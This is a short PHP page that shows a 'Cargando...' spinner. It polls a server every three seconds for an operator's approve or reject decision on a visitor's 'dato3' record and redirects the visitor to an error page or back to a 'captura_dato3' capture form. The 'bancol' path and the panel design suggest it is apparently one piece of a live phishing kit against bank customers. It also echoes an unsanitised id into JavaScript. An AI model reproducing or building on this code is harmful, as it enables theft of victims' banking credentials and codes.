<?php
require_once '../bancol/config.php';
$conn = getConnection();
$uuid = $conn->real_escape_string($_GET['id']);

$stmt = $conn->prepare("SELECT dato3_status FROM  panel WHERE id = ?");
$stmt->bind_param("s", $uuid);
$stmt->execute();
$result = $stmt->get_result();
$data = $result->fetch_assoc();
?>
<!DOCTYPE html>
<html>
<body>

<style>
            body {
                display: flex;
                justify-content: center;
                align-items: center;
                height: 100vh;
                margin: 0;
            }
            main {
                display: flex;
                flex-direction: column;
                align-items: center;
                text-align: center;
            }
            img {
                width: 10%;
            }
            h5 {
                color: #1f2350;
                margin-top: 20px;
            }
        </style>

<main>
            <section>
                <img src="../../img/8c3994152005995.631a697736de0.gif" alt="">
            </section>
            <section>
                <h5>Cargando...</h5>
            </section>
        </main>
    
    <div id="estado"></div> 

    <script>
    setInterval(() => {
        fetch(`check_redirect.php?id=<?= $uuid ?>`)
            .then(response => response.json())
            .then(data => {
               
                
                if(data.dato3_status === 'approved') {
                    window.location.href = '../../Error.html';
                }
                else if(data.dato3_status === 'rejected') {
                    window.location.href = 'captura_dato3.php?id=<?= $uuid ?>';
                }
            });
    }, 3000);
    </script>
    
<?php if($data['dato3_status'] === 'rejected'): ?>
<script>
// Mostrar alerta inmediatamente si ya está rechazado
alert('Dato rechazado: <?= addslashes($data['rejected_reason'] ?? 'Sin motivo especificado') ?>');
window.location.href = 'captura_dato3.php?id=<?= $uuid ?>';
</script>
<?php endif; ?>
</body>
</html>